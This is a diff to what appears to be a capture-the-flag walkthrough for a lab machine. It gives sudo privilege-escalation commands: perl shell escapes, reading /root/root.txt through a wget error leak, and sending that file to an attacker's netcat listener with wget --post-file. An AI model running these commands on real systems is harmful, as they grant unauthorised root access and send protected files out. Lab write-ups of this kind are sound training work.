@@ -65,9 +65,17 @@ perl —e 'exec "/bin/sh";'
   - ```sudo perl -e 'exec "/bin/bash";'```
 
 # easy way to get root/root.txt <a name="root.txt"></a>
-1️⃣ Read the Root Flag Using --input-file:
+### 1️⃣ Read the Root Flag Using --input-file:
+- Use a root-only file (/root/root.txt) as an input to wget.
+- It will try to parse it as a URL, fail, and leak the content (flag) in the error.
+  - `sudo wget --input-file=/root/root.txt`
 
-Use a root-only file (/root/root.txt) as an input to wget.
-It will try to parse it as a URL, fail, and leak the content (flag) in the error.
 
-sudo wget --input-file=/root/root.txt
+### 2️⃣ Exfiltrate the Flag Using --post-file:
+- Use wget to send the flag to your attack machine.
+- Steps:
+  - 1. On your Kali machine, start a netcat listener:
+    - `nc -lnvp 443`
+  - 2. On the victim (sammy), run:
+    - `sudo wget --post-file=/root/root.txt http://<your-ip>:443/`
+- >The flag is sent to your listener.
